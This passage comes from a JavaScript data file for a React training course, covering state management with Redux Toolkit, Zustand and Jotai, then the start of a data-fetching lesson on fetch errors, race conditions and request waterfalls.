          note: `<p>If your team is on Redux, this replaces every hand-written "fetch thunk + loading flag + products slice". The concepts map closely to TanStack Query (Day 7): a cache keyed by endpoint + args, tags ≈ query keys for invalidation, automatic refetching. Pick one server-state library per app, not both.</p>`
        },
        {
          t: "Jotai: atoms and derived atoms",
          lang: "tsx",
          code: `// npm install jotai
import { atom, useAtom, useAtomValue, useSetAtom } from "jotai";

type Todo = { id: number; title: string; done: boolean };
type Filter = "all" | "open" | "done";

const todosAtom = atom<Todo[]>([]);
const filterAtom = atom<Filter>("all");

// Derived (read-only) atom: recomputed when todosAtom or filterAtom changes
const visibleTodosAtom = atom((get) => {
  const filter = get(filterAtom);
  const todos = get(todosAtom);
  return filter === "all" ? todos : todos.filter((t) => (filter === "done" ? t.done : !t.done));
});
const openCountAtom = atom((get) => get(todosAtom).filter((t) => !t.done).length);

export function FilterBar() {
  const [filter, setFilter] = useAtom(filterAtom);
  return (
    <select value={filter} onChange={(e) => setFilter(e.target.value as Filter)}>
      <option value="all">All</option>
      <option value="open">Open</option>
      <option value="done">Done</option>
    </select>
  );
}

export function OpenCount() {
  const n = useAtomValue(openCountAtom);   // doesn't re-render when only the filter changes
  return <span>{n} open</span>;
}

export function TodoList() {
  const todos = useAtomValue(visibleTodosAtom);
  const setTodos = useSetAtom(todosAtom);  // write-only: never re-renders from todos changes
  return (
    <ul>
      {todos.map((t) => (
        <li key={t.id}>
          <label>
            <input
              type="checkbox"
              checked={t.done}
              onChange={() =>
                setTodos((prev) => prev.map((x) => (x.id === t.id ? { ...x, done: !x.done } : x)))
              }
            />
            {t.title}
          </label>
        </li>
      ))}
    </ul>
  );
}`,
          note: `<p>Without a <code>&lt;Provider&gt;</code>, Jotai uses a default global store; wrap a subtree in Jotai's <code>Provider</code> to give it isolated state (useful in tests). Note that this demo's "filter" would usually belong in the URL in a real app.</p>`
        },
        {
          t: "Migrating legacy Redux, before and after",
          lang: "ts",
          code: `// ---------- BEFORE (legacy, ~2017 style) ----------
// const FETCH_ORDERS_REQUEST = "FETCH_ORDERS_REQUEST";
// const FETCH_ORDERS_SUCCESS = "FETCH_ORDERS_SUCCESS";
// const FETCH_ORDERS_FAILURE = "FETCH_ORDERS_FAILURE";
// const TOGGLE_SIDEBAR = "TOGGLE_SIDEBAR";
//
// function ordersReducer(state = { list: [], loading: false, error: null }, action) {
//   switch (action.type) {
//     case FETCH_ORDERS_REQUEST: return { ...state, loading: true };
//     case FETCH_ORDERS_SUCCESS: return { ...state, loading: false, list: action.payload };
//     case FETCH_ORDERS_FAILURE: return { ...state, loading: false, error: action.error };
//     default: return state;
//   }
// }
// function uiReducer(state = { sidebarOpen: true }, action) {
//   switch (action.type) {
//     case TOGGLE_SIDEBAR: return { ...state, sidebarOpen: !state.sidebarOpen };
//     default: return state;
//   }
// }
// const store = createStore(combineReducers({ orders: ordersReducer, ui: uiReducer }),
//                           applyMiddleware(thunk));
// export default connect((s) => ({ orders: s.orders.list }), { fetchOrders })(OrdersPage);

// ---------- STEP 1: same reducers, modern store (no behaviour change) ----------
import { configureStore, createSlice } from "@reduxjs/toolkit";
// export const store = configureStore({ reducer: { orders: ordersReducer, ui: uiReducer } });

// ---------- STEP 2: client state -> createSlice ----------
const uiSlice = createSlice({
  name: "ui",
  initialState: { sidebarOpen: true },
  reducers: {
    sidebarToggled(state) { state.sidebarOpen = !state.sidebarOpen; },
  },
});
export const { sidebarToggled } = uiSlice.actions;

// ---------- STEP 3: server state -> query layer; delete ordersReducer and its thunk ----------
// RTK Query:        getOrders: build.query<Order[], void>({ query: () => "orders" })
// or TanStack Query: useQuery({ queryKey: ["orders"], queryFn: fetchOrders })

// ---------- RESULT ----------
export const store = configureStore({
  reducer: { ui: uiSlice.reducer /*, [api.reducerPath]: api.reducer */ },
});

// ---------- STEP 4: connect() -> hooks, component by component ----------
// const sidebarOpen = useAppSelector((s) => s.ui.sidebarOpen);
// const dispatch = useAppDispatch();  dispatch(sidebarToggled());`,
          note: `<p>Each step ships independently and keeps the app working, because RTK produces ordinary Redux reducers and actions. To keep old <code>dispatch({ type: "TOGGLE_SIDEBAR" })</code> calls working during the transition, a slice can respond to external action types via <code>extraReducers</code>. Expect step 3 to delete most of the code.</p>`
        }
      ],
      internals: `<p><b>External stores and tearing.</b> With concurrent rendering (Day 12), React may pause rendering partway through a tree and resume later. If components read a mutable external store directly during render, some could read the old value and some the new one within a single render: a visual inconsistency called <b>tearing</b>. <code>useSyncExternalStore</code> prevents this: React reads <code>getSnapshot()</code> during render, re-checks it before committing, and if the store changed mid-render it re-renders synchronously so the whole tree commits with one consistent snapshot. The trade-off is that updates from external stores can't be rendered as interruptible transitions the way <code>useState</code> updates can.</p>
<p><b>Why <code>getSnapshot</code> must be stable.</b> React calls <code>getSnapshot</code> on render and after subscription notifications, and compares results with <code>Object.is</code>. If it returns a new object each call, React concludes the store changed every time, re-renders, calls it again, sees another new object… In development React warns ("The result of getSnapshot should be cached to avoid an infinite loop"). This is the mechanism behind Zustand v5's infinite loop with unstable selectors.</p>
<p><b>How React Redux uses it.</b> <code>&lt;Provider store&gt;</code> puts the <i>store object</i> (which never changes) into a React context. <code>useSelector(selector)</code> gets the store from context and calls <code>useSyncExternalStore</code> (via a "with selector" variant that memoises the selected result and supports a custom equality function). After every dispatch, the store notifies subscribers; each <code>useSelector</code> runs its selector and compares the result with <code>===</code> (or your <code>equalityFn</code>). So context transports the store, and selectors decide re-renders. React Redux v8 and later are built on this hook. In development, React Redux 9 also runs selectors twice to warn when a selector returns a different reference for the same input.</p>
<p><b>How Redux Toolkit's "mutations" work.</b> Inside a <code>createSlice</code> reducer, <code>state</code> is an Immer <b>draft</b>: a Proxy that records writes. When the reducer finishes, Immer produces a new object for every path that changed and reuses (structurally shares) every untouched subtree. That structural sharing is what makes selectors cheap: <code>s.cart.items</code> is the same array reference until something in it changes, so <code>===</code> comparisons work. In development Immer also freezes the result, so accidental mutation outside a reducer throws.</p>
<p><b>Zustand's store.</b> The vanilla store is a closure: <code>state</code>, a <code>Set</code> of listeners, <code>setState</code> (which merges partial state into a new object and notifies listeners only if the result changed by <code>Object.is</code>), <code>getState</code> and <code>subscribe</code>. The React hook is essentially <code>useSyncExternalStore(api.subscribe, () =&gt; selector(api.getState()))</code>. <code>useShallow</code> wraps your selector so that, if the new result is shallow-equal to the previous one, it returns the <i>previous</i> reference, making the snapshot stable.</p>
<p><b>Jotai's atoms.</b> An atom is a config object (a key); values live in a store, a <code>WeakMap</code> from atom to state plus a dependency graph. Reading a derived atom records which atoms it called <code>get</code> on; when a base atom changes, Jotai recomputes dependents and notifies only components subscribed to atoms whose values changed. Conceptually it's a reactive spreadsheet sitting outside React, still connected through subscriptions.</p>`,
      prod: `<p><b>A sane default architecture for React → FastAPI → Redis → PostgreSQL:</b></p>
<ul class="pts">
<li><b>Server state</b> (90% of what screens show): TanStack Query hooks per resource, query keys mirroring FastAPI routes (<code>["orders", { status, page }]</code>), invalidation after mutations. FastAPI may serve some of these from a Redis cache; the client cache is a second layer with its own <code>staleTime</code>. Two caches mean you reason about freshness at both: a mutation must invalidate Redis server-side and the query client-side.</li>
<li><b>URL state</b>: filters, sort, pagination, selected tab, open drawer id. Shareable links, working back button, and support tickets that include the exact view.</li>
<li><b>Client state</b>: theme and auth session in context; a small Zustand store (or RTK slice) for cross-cutting UI like the cart, command palette, or a multi-panel editor's selection.</li>
<li><b>Forms</b>: React Hook Form + Zod, validation errors from FastAPI (422 responses) mapped onto fields (Day 9).</li>
</ul>
<p><b>What goes wrong at scale.</b></p>
<ul class="pts">
<li><b>Server data copied into Redux/Zustand.</b> Lists go stale after another tab edits them; the same entity exists in three slices with different values; every mutation needs hand-written "update it everywhere" code. The fix is moving fetching to a query layer and deleting slices.</li>
<li><b>Whole-store subscriptions.</b> <code>useStore()</code> without a selector, or <code>useSelector((s) =&gt; s)</code>, in a top-level layout re-renders the whole app on every action. Lint for it in code review; the Profiler makes it obvious.</li>
<li><b>Unstable selectors.</b> <code>useSelector((s) =&gt; s.items.filter(...))</code> re-renders on every dispatch; in Zustand v5 the equivalent can loop. Use <code>createSelector</code>/<code>useShallow</code>, or derive in the component.</li>
<li><b>Global stores leaking between users or tests.</b> Module-level singletons survive across tests (reset them in <code>beforeEach</code>) and across requests in SSR (create a store per request). On logout, clear client stores that hold user-specific data (cart, drafts) so the next user doesn't see them.</li>
<li><b>Persisted state schema drift.</b> A persisted Zustand/Redux store from last month's release has a different shape; the app crashes on load. Use the <code>version</code> + <code>migrate</code> options of <code>persist</code> (or redux-persist migrations) and persist only what you must.</li>
<li><b>Library sprawl.</b> One team adds Zustand, another adds Jotai, the legacy part uses Redux with sagas. Agree on one per app and document the classification rules in the repo.</li>
</ul>`,
      iq: [
        ["fresher", "What is the difference between client state and server state?", `<p>Client state is owned by the browser session: UI flags, theme, a draft form, a cart before checkout. You are its single source of truth. Server state is data owned by the backend (FastAPI + PostgreSQL); the client only holds a <b>cached copy</b> that can become stale, needs loading/error handling, refetching and invalidation after changes. That difference is why server state goes into a cache library like TanStack Query rather than a general store.</p>`],
        ["fresher", "In Redux Toolkit you write state.items.push(item) in a reducer. Isn't that mutating state?", `<p>It looks like it, but <code>createSlice</code> reducers receive an Immer <b>draft</b>. Immer records the changes and produces a new immutable state, sharing unchanged parts. It's safe <i>only</i> inside RTK reducers (or other Immer producers). The same line in a plain reducer or a component would be a real mutation and break re-rendering.</p>`],
        ["mid", "Why does this Zustand selector cause problems: useStore((s) => ({ a: s.a, b: s.b }))?", `<p>The selector returns a new object every time it runs, so the default <code>Object.is</code> comparison always reports a change. In Zustand v4 that means re-rendering on every store update; in v5 (which relies on <code>useSyncExternalStore</code> semantics) it can cause an infinite update loop. Fix: wrap with <code>useShallow</code>, or call the hook twice with primitive selectors (<code>useStore((s) =&gt; s.a)</code>).</p>`],
        ["mid", "When does a component using useSelector re-render?", `<p>After every dispatched action, React Redux runs the component's selector against the new state and compares the result with the previous result using <code>===</code> by default. It re-renders only if they differ (or if its parent re-renders it). So a selector returning a primitive or an existing reference is cheap; one that maps/filters into a new array re-renders every time. Memoise derived data with <code>createSelector</code> or pass <code>shallowEqual</code> as the equality function.</p>`],
        ["mid", "Where should search filters and pagination live, and why?", `<p>In the URL (search params). That makes the view shareable and bookmarkable, survives refresh, makes back/forward work, and gives the query layer its inputs directly (<code>queryKey: ["products", { q, page }]</code>). Keeping them in Redux or Zustand duplicates state the router already holds and loses all of those benefits.</p>`],
        ["senior", "What is useSyncExternalStore and why did React add it?", `<p>It subscribes a component to a store outside React: <code>useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot?)</code>. React added it with concurrent rendering because reading a mutable store directly during an interruptible render can cause <b>tearing</b>: parts of the UI showing different versions of the store. The hook guarantees a consistent snapshot per render, forcing a synchronous re-render if the store changes mid-render. <code>getSnapshot</code> must return a cached value when nothing changed. Redux and Zustand are built on it.</p>`],
        ["senior", "A team keeps API responses in Redux slices with loading flags. What problems do you expect and what would you propose?", `<p>Expect: stale data after other users or tabs change things, no request deduplication, inconsistent copies of the same entity in multiple slices, hand-written invalidation after every mutation, loading/error flags per endpoint, race conditions when parameters change quickly, and a lot of boilerplate. Propose moving server data to a query library: RTK Query since they're on Redux, or TanStack Query. Migrate endpoint by endpoint and delete the slices; keep Redux only for real client state. The tempting answer, "add a normaliser like <code>createEntityAdapter</code>", fixes duplication but not staleness or invalidation.</p>`],
        ["senior", "Redux Toolkit vs Zustand: how do you compare them?", `<p>Both are external stores with selector-based subscriptions, so performance is similar when used well. RTK gives a strict action/reducer model, excellent DevTools with an action log and time travel, middleware, conventions that scale across many developers, and RTK Query for server data, at the cost of more ceremony and a Provider. Zustand is minimal: a hook-shaped store with actions as functions, no provider, middleware available; it's faster to adopt but enforces less structure, so large teams must add their own conventions. Choose based on team size, need for auditability/undo, and whether there's an existing Redux codebase, not on bundle-size folklore.</p>`],
        ["lead", "How would you migrate a large legacy Redux codebase (connect, thunks, sagas) without a big-bang rewrite?", `<p>Switch to <code>configureStore</code> with the existing reducers (no behaviour change, and its dev checks find mutation bugs). Ban new legacy patterns via lint/review. Convert slices to <code>createSlice</code> as they are touched; replace <code>connect</code> with typed hooks per component. Move server-data flows (thunks/sagas that fetch and store) to RTK Query or TanStack Query one endpoint at a time, deleting slices as they go. Keep sagas only for genuinely complex workflows, or replace them with RTK's listener middleware. Measure progress by lines/slices removed, and keep the app shippable after each PR.</p>`],
        ["architect", "Define a state-management strategy for a new product with five frontend teams.", `<p>Write down the classification and the sanctioned tool per class: local state with hooks; URL for shareable view state; TanStack Query (or RTK Query if Redux is chosen) for <b>all</b> server data, with query-key conventions per FastAPI resource and an invalidation policy; context only for stable cross-cutting dependencies (auth session, theme, i18n, flags); <b>one</b> client store library for the remaining global client state, with feature-owned stores or slices and no cross-feature imports of internals. Add guardrails: lint rules (no whole-store subscriptions), a shared fetch client handling auth/401s, store reset on logout, persisted-state versioning, and Profiler checks in performance budgets. Revisit when real requirements (offline, collaboration, undo) appear, rather than choosing heavy tooling up front.</p>`]
      ],
      gotchas: [
        `<b>Zustand without a selector subscribes to everything.</b> <code>const { items } = useCartStore()</code> re-renders on any change to any field, including unrelated ones added later.`,
        `<b>Zustand v5 + object/array-returning selector</b> can loop forever ("Maximum update depth exceeded"). Use <code>useShallow</code>, primitive selectors, or derive outside the selector.`,
        `<b><code>useSelector((s) =&gt; s.items.filter(...))</code></b> returns a new array every action, so the component re-renders on every dispatch anywhere in the app. React Redux 9 warns about this in development. Use <code>createSelector</code>.`,
        `<b><code>createSelector</code> with a single shared cache</b> recomputes when used by many components with different arguments (cache size 1 in older Reselect versions; newer versions use a different memoiser, so check your version). Create one selector instance per component with <code>useMemo</code> when arguments differ.`,
        `<b>Immer's "return or mutate" rule:</b> in a <code>createSlice</code> reducer you either mutate the draft or return a new value, not both. <code>state.x = 1; return state;</code> style mistakes and returning <code>undefined</code> accidentally (arrow function with braces) are classic errors.`,
        `<b>Non-serialisable values in Redux</b> (Date, Map, class instances, Promises) trigger warnings and break DevTools/persistence. Store ISO strings and plain objects.`,
        `<b>Persisted stores and logout:</b> a persisted cart or draft survives logout and appears for the next user on a shared machine. Clear user-scoped stores on logout.`,
        `<b>Module-level stores in tests</b> keep state between tests. Reset with <code>useStore.setState(initialState)</code> (Zustand) or create a fresh store per test (Redux).`
      ],
      best: [
        `Classify every piece of state (local, global client, server, URL) before choosing where it lives; write the rules in the repo's architecture docs.`,
        `All server data goes through one query layer (TanStack Query or RTK Query). Never mirror API responses into a client store.`,
        `Subscribe with the narrowest selector possible; return primitives or existing references; use <code>useShallow</code> (Zustand) or <code>createSelector</code> (Redux) for derived objects.`,
        `Define typed hooks once (<code>useAppSelector</code>, <code>useAppDispatch</code>) and named selectors next to the slice/store; components shouldn't know the state shape.`,
        `Keep stores small and feature-owned; actions describe events (<code>itemAdded</code>), not setters for every field.`,
        `Persist only what must survive reload, with a version and migration; reset user-scoped state on logout.`,
        `Use one client-store library per app; prefer the boring choice your team already knows.`
      ],
      lab: [
        `In your Vite app, list every piece of state on one existing page in a table with four columns (local, global client, server, URL). Move at least one item to where it belongs (for example, a filter into <code>useSearchParams</code>).`,
        `Write <code>src/lib/create-store.ts</code> from example 2. Build a counter with two components: one selects <code>count</code>, one selects <code>step</code>. Add <code>console.log</code>s and confirm only the right one re-renders. Then change a selector to return <code>{ count: s.count }</code> and read the warning React prints.`,
        `<code>npm install zustand</code>. Implement the cart store (example 3) and <code>CartBadge</code>/<code>CartSummary</code> (example 4). Reproduce the bad object selector without <code>useShallow</code>, observe the error, then fix it.`,
        `<code>npm install @reduxjs/toolkit react-redux</code>. Re-implement the same cart with <code>createSlice</code>, <code>configureStore</code> and typed hooks (example 5). Open Redux DevTools in the browser and step back through the action log.`,
        `Add one RTK Query endpoint (or wait for Day 7 and use TanStack Query) for <code>GET /api/products</code>, and delete any hand-written "products" state.`,
        `<b>Done when:</b> you can explain where each piece of state on your page lives and why; the badge re-renders only when the count changes in both the Zustand and the RTK versions (verified with logs or the Profiler); and no API response is stored in a client store.`
      ],
      teach: `<p>"Before picking a state library I ask what kind of state it is. There are four kinds. Local UI state, like whether a dropdown is open, stays in <code>useState</code>. URL state, like filters and the page number, goes in the search params so it's shareable. Server state, anything that came from our FastAPI backend, is really a cache of someone else's data, so it goes in TanStack Query, which handles staleness, refetching and invalidation. Only what's left, genuinely global client state like the cart or the theme, needs a store."</p>
<p>"For that, context is fine if it changes rarely. If it changes often or many components read it, I use an external store: Zustand for small apps, Redux Toolkit for big teams or complex client logic, since it gives us slices, Immer, typed hooks and great DevTools, and RTK Query for server data if we're already on Redux."</p>
<p>"All these stores connect to React through <code>useSyncExternalStore</code>. Each component subscribes with a selector and only re-renders when its selected value changes. So the number one rule is: select small values, and never return a fresh object from a selector without <code>useShallow</code> or <code>createSelector</code>, or you re-render on every change, or in Zustand 5 you loop forever."</p>`
    }
  ],
  quiz: [
    {
      q: `Every time <code>App</code>'s clock ticks (once a second), all 200 components that call <code>useAuth()</code> re-render, even though the user never changes. Find the bug.`,
      code: `function App() {
  const [now, setNow] = useState(Date.now());
  useEffect(() => {
    const id = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(id);
  }, []);
  const [user, setUser] = useState<User | null>(null);
  const logout = () => setUser(null);

  return (
    <AuthContext value={{ user, logout }}>
      <Clock now={now} />
      <Dashboard />
    </AuthContext>
  );
}`,
      lang: "tsx",
      ans: `The provider value <code>{ user, logout }</code> (and <code>logout</code> itself) is recreated on every <code>App</code> render, so <code>Object.is</code> sees a new value each second and every consumer re-renders. Memoise with <code>useCallback</code> + <code>useMemo</code>, and move auth state into its own <code>AuthProvider</code> so the clock doesn't re-render it at all.`,
      why: `<p>Context compares the provider value by identity, not by contents. Here the parent re-renders every second for an unrelated reason (the clock), creating a new object each time. Even <code>React.memo</code> on consumers wouldn't help, because context changes bypass memo. The best fix is structural: an <code>AuthProvider</code> component that owns <code>user</code> and receives <code>children</code>. Then the clock's state lives elsewhere and the provider doesn't even re-render. (Also, <code>Dashboard</code> here re-renders every second because <code>App</code> re-renders it directly; moving the clock state into <code>Clock</code> fixes that too.)</p>`
    },
    {
      q: `This Zustand v5 component crashes with "Maximum update depth exceeded" as soon as it mounts. Why, and what are two fixes?`,
      code: `const { items, total } = useCartStore((s) => ({
  items: s.items,
  total: s.items.reduce((sum, i) => sum + i.price * i.qty, 0),
}));`,
      lang: "tsx",
      ans: `The selector returns a brand-new object on every call, so the snapshot is never stable and React keeps re-rendering. Fix 1: wrap it in <code>useShallow(...)</code>. Fix 2: use two primitive/stable selectors: <code>useCartStore((s) =&gt; s.items)</code> and <code>useCartStore(selectTotal)</code>.`,
      why: `<p>Zustand's hook is built on <code>useSyncExternalStore</code>, which compares snapshots with <code>Object.is</code>. A new object each time means "changed" each time, which in v5 leads to the update loop (v4 had a different implementation where the same code "only" re-rendered on every store change). <code>useShallow</code> compares the object's top-level values (<code>items</code> is the same array reference and <code>total</code> is the same number), and returns the previous object when they match.</p>`
    },
    {
      q: `A teammate proposes this for the product list. The list comes from FastAPI <code>GET /api/products</code>. What would you say in code review?`,
      code: `const productsSlice = createSlice({
  name: "products",
  initialState: { list: [] as Product[], loading: false, error: null as string | null },
  reducers: {
    fetchStarted(state) { state.loading = true; },
    fetchSucceeded(state, a: PayloadAction<Product[]>) { state.loading = false; state.list = a.payload; },
    fetchFailed(state, a: PayloadAction<string>) { state.loading = false; state.error = a.payload; },
  },
});
// + a thunk that fetches and dispatches these, called from useEffect in ProductsPage`,
      lang: "ts",
      ans: `This is server state stored in a client store. Use RTK Query (we're already on Redux) or TanStack Query: you get caching per arguments, deduplication, refetching, invalidation after mutations and loading/error states without writing a slice.`,
      why: `<p>The slice only handles the happy path of a single fetch. It doesn't know when the data is stale, doesn't dedupe two components requesting it, ignores race conditions when filters change, and needs manual "update the list" code after every create/update/delete. A query library treats the response as a cache entry keyed by the request (<code>getProducts</code> + args, or <code>["products", filters]</code>) and invalidates it after mutations. Redux stays for real client state.</p>`
    },
    {
      q: `What does this render, and why?`,
      code: `const LangContext = createContext("en");

function App() {
  const lang = useContext(LangContext);
  return (
    <LangContext value="fr">
      <p>App sees: {lang}</p>
      <Child />
    </LangContext>
  );
}
function Child() {
  return <p>Child sees: {useContext(LangContext)}</p>;
}`,
      lang: "tsx",
      ans: `"App sees: en" and "Child sees: fr".`,
      why: `<p><code>useContext</code> finds the nearest provider <b>above</b> the calling component. <code>App</code> renders the provider but is not inside it, so it gets the default <code>"en"</code> (there's no provider above <code>App</code>). <code>Child</code> is rendered inside the provider and gets <code>"fr"</code>. Calling <code>useContext</code> inside <code>Child</code>'s JSX expression is fine because it still runs unconditionally during <code>Child</code>'s render.</p>`
    },
    {
      q: `A cart uses one context: <code>value={{ state, dispatch }}</code> (memoised with <code>useMemo</code>). The product grid has 60 <code>AddToCartButton</code>s wrapped in <code>memo</code> that only call <code>dispatch</code>. Adding an item makes all 60 re-render. Which approach would you choose?`,
      ans: `Split into two contexts: <code>CartStateContext</code> and <code>CartDispatchContext</code>. The buttons read only the dispatch context, whose value never changes, so they never re-render on cart updates.`,
      why: `<p>The <code>useMemo</code> is correct but doesn't help: <code>state</code> changes on every action, so the memoised value changes too, and every consumer of that context re-renders regardless of <code>memo</code>. <code>dispatch</code> from <code>useReducer</code> is stable, so a separate dispatch context has a constant value. If the cart also had many state readers that each need only a small part, moving it to Zustand or Redux with selectors would be the next step.</p>`
    },
    {
      q: `Your <code>ProductsPage</code> stores the search text, category filter and page number in a Zustand store. Product managers complain that links shared in Slack always open page 1 with no filters, and the back button doesn't undo a filter change. Which approach would you choose?`,
      ans: `Move them to the URL: <code>useSearchParams</code> for <code>q</code>, <code>category</code> and <code>page</code>, and feed those into the query key. Delete them from the store.`,
      why: `<p>These are URL state: they define <i>which view</i> you're looking at. In the URL they're shareable, bookmarkable, survive reload, and each change becomes a history entry so back/forward work. The data query reads them directly (<code>["products", { q, category, page }]</code>), so there's one source of truth instead of a store that must be kept in sync with the address bar. Day 8 covers search params in React Router.</p>`
    }
  ]
},
/* ===== Day 7 ===== */
{
  n: 7,
  title: "Data fetching",
  goal: `<b>By the end of today</b> you can write a typed API client for a FastAPI backend that turns non-2xx responses into real errors, fetch in an effect without race conditions, explain waterfalls, CORS and React 19's <code>use(promise)</code>, and then replace hand-rolled fetching with TanStack Query v5: query keys, <code>staleTime</code> vs <code>gcTime</code>, mutations with invalidation, optimistic updates with rollback, and cursor-based infinite scrolling.`,
  rev: [
    `<b><code>fetch</code> only rejects on network failure</b> (DNS, offline, CORS block, abort). A 404, 422 or 500 <i>resolves</i> with <code>res.ok === false</code>. Your API client must check <code>res.ok</code>, parse FastAPI's <code>{"detail": ...}</code> body and throw a typed <code>ApiError</code> carrying the status.`,
    `<b>Effects that fetch need cleanup.</b> Without it, a slow response for the <i>previous</i> <code>userId</code> can land after the current one and overwrite it (race condition). Fix with an <code>ignore</code> flag or, better, an <code>AbortController</code> whose <code>abort()</code> runs in the cleanup. StrictMode in dev runs effect → cleanup → effect, so you will see one aborted request: that is expected.`,
    `<b>Waterfalls</b> happen when request B only starts after A's component renders. Start independent requests together (<code>Promise.all</code>, parallel queries, route loaders, prefetching) or add an aggregate endpoint on FastAPI. <b>CORS</b> is enforced by the browser: either allow your origin with FastAPI's <code>CORSMiddleware</code> or make the API same-origin (Vite <code>server.proxy</code> in dev, a reverse proxy in prod).`,
    `<b>TanStack Query v5</b> is a server-state cache keyed by arrays. <code>staleTime</code> (default 0) = how long data counts as fresh (no background refetch); <code>gcTime</code> (default 5 min) = how long an <i>unused</i> query stays in memory. <code>isPending</code> = no data yet; <code>isFetching</code> = a request is in flight. Default: 3 retries with backoff, refetch on window focus, mount and reconnect when stale.`,
    `<b>Mutations</b>: <code>useMutation</code> + <code>queryClient.invalidateQueries({ queryKey })</code> in <code>onSuccess</code>/<code>onSettled</code>. Optimistic update recipe: <code>onMutate</code> → <code>cancelQueries</code>, snapshot with <code>getQueryData</code>, <code>setQueryData</code>, return the snapshot → <code>onError</code> restores it → <code>onSettled</code> invalidates. Remember the backend's Redis cache is a <i>second</i> cache: FastAPI must invalidate it on writes or your refetch just gets stale data again.`
  ],
  topics: [
    /* ------------------------------------------------------------------ */
    {
      id: "d7-fetching",
      title: "Fetching data: effects, race conditions, Suspense and use()",
      lv: ["fresher", "mid", "senior", "architect"],
      eli5: `<p>Imagine you're at a restaurant counter. You order a coffee, the barista says "coming up", and you wait. While you wait, the sign above you says <b>"Preparing..."</b> (loading). Then either you get your coffee (data) or the barista says "sorry, we're out of milk" (error). Every screen that shows server data goes through those same three moods: loading, error, success.</p>
<p>Now imagine you change your mind: you order a coffee, then quickly say "actually, make it a tea". If the barista is slow with the coffee and fast with the tea, you might get the tea and then, a minute later, the coffee lands on top of it. You end up holding the <i>wrong</i> drink. That's a <b>race condition</b>: an old answer arriving after a newer one. The fix is simple: when you change your order, you tell the barista "<b>cancel the coffee</b>" (<code>AbortController</code>), or you promise yourself to <b>ignore</b> any coffee that turns up.</p>
<p>A <b>waterfall</b> is when you order the starter, wait for it, eat it, and only <i>then</i> order the main course, when you could have ordered both at once. Lots of slow apps are slow purely because they ask for things one after another.</p>
<p><b>Suspense</b> is a polite waiter who says "I'll keep this whole table on the 'Preparing...' sign until everything is ready", so you don't see half a meal. In React 19, <code>use(promise)</code> lets a component say "I need this order; pause me until it arrives".</p>`,
      what: `<p>React itself does not fetch data. It renders UI from state. "Data fetching in React" means: start a network request at the right moment, store the result (and the loading/error status) in state, and make sure the request belongs to the <i>current</i> props, not an old version of them. Today we build it by hand to understand every moving part, then (next topic) hand the job to TanStack Query.</p>
<h5>1. The transport: <code>fetch</code> and a typed API client</h5>
<p>The browser's <code>fetch(url, init)</code> returns a <code>Promise&lt;Response&gt;</code>. Two facts trip everyone up:</p>
<ul class="pts">
<li><b><code>fetch</code> does not reject on HTTP errors.</b> A 404, 401, 422 or 500 is a successful HTTP exchange, so the promise <i>resolves</i> and <code>res.ok</code> is <code>false</code>. It only rejects for network-level failures: offline, DNS failure, connection refused, a CORS block, or an abort (rejects with a <code>DOMException</code> named <code>AbortError</code>).</li>
<li><b>The body is a stream you read once.</b> <code>res.json()</code>, <code>res.text()</code> and friends each return a promise and consume the body; calling a second reader throws. <code>res.json()</code> on an empty body (a FastAPI <code>204 No Content</code>) throws a <code>SyntaxError</code>.</li>
</ul>
<p>So every real app wraps <code>fetch</code> in one small module, the <b>API client</b>, that: prefixes the base URL, sets JSON headers, sends cookies or a bearer token, checks <code>res.ok</code>, parses FastAPI's error shape, handles 204, and returns a typed value. FastAPI's errors look like this:</p>
<ul class="pts">
<li><code>raise HTTPException(404, "User not found")</code> → <code>{"detail": "User not found"}</code></li>
<li>Pydantic validation failure (422) → <code>{"detail": [{"loc": ["body","email"], "msg": "...", "type": "..."}]}</code>: <code>detail</code> is an <i>array</i>.</li>
<li>An unhandled exception (500) may return plain text (<code>Internal Server Error</code>), not JSON. Your parser must tolerate that.</li>
</ul>
<p>A note on types: <code>res.json()</code> returns <code>Promise&lt;any&gt;</code>. Writing <code>api&lt;User&gt;(...)</code> is a <i>claim</i>, not a check: TypeScript cannot see the network. For untrusted or evolving APIs, validate at the boundary with Zod (Day 9) or generate types from FastAPI's OpenAPI schema (e.g. with a tool like <code>openapi-typescript</code>) so the client and server can't silently drift.</p>
<h5>2. Fetching in <code>useEffect</code>: the three states</h5>
<p>Day 5 introduced effects as "synchronise with something outside React". A network request for "the user whose id is in props" fits that description: when <code>userId</code> changes, re-synchronise. The minimal shape is:</p>
<ul class="pts">
<li>State for <b>data</b>, <b>error</b> and <b>loading</b> (better: one discriminated union <code>{status:"loading"} | {status:"error", error} | {status:"success", data}</code> so impossible combinations like "loading and error" can't exist).</li>
<li>An effect with <code>[userId]</code> in its dependency array that starts the request.</li>
<li>A <b>cleanup</b> that cancels or ignores the request when <code>userId</code> changes or the component unmounts.</li>
</ul>
<h5>3. Race conditions</h5>
<p>Requests don't finish in the order you start them. If the user clicks user 1 then user 2, and <code>/api/users/1</code> happens to be slow (cold Redis cache, slow Postgres query), the responses arrive 2 then 1. Without cleanup, the effect for user 1 calls <code>setUser(user1)</code> <i>last</i>, and the screen shows user 1's data under user 2's heading. Two fixes:</p>
<ul class="pts">
<li><b>Ignore flag</b>: <code>let ignore = false</code> in the effect, <code>ignore = true</code> in the cleanup, and only <code>setState</code> if <code>!ignore</code>. Each effect run has its own closure and its own flag. The stale request still completes and wastes bandwidth, but its result is dropped.</li>
<li><b><code>AbortController</code></b>: create a controller per effect run, pass <code>controller.signal</code> to <code>fetch</code>, call <code>controller.abort()</code> in the cleanup. The browser actually cancels the request (it shows as "(canceled)" in DevTools), the promise rejects with <code>AbortError</code>, and you skip state updates for aborted requests. Note: aborting stops the <i>client</i> waiting; FastAPI may still finish the work server-side, so aborting is not a substitute for idempotent endpoints.</li>
</ul>
<h5>4. Waterfalls</h5>
<p>A <b>request waterfall</b> is a chain of sequential requests where each one could have started earlier. The classic React version: <code>&lt;Profile&gt;</code> fetches the user, renders a spinner until it arrives, then renders <code>&lt;Posts&gt;</code>, whose own effect only <i>now</i> starts fetching posts. Total time = sum of latencies instead of max. Code splitting makes it worse: lazy chunk → render → fetch → render child → fetch. Fixes, from local to global:</p>
<ul class="pts">
<li>Start independent requests together: <code>Promise.all</code>, or lift both fetches to the parent.</li>
<li>Fetch <i>before</i> render: in a route loader (React Router, Day 8), on hover/intent (prefetching), or in the event handler that navigates.</li>
<li>Use a cache library that dedupes and parallelises (TanStack Query <code>useQueries</code>, prefetching).</li>
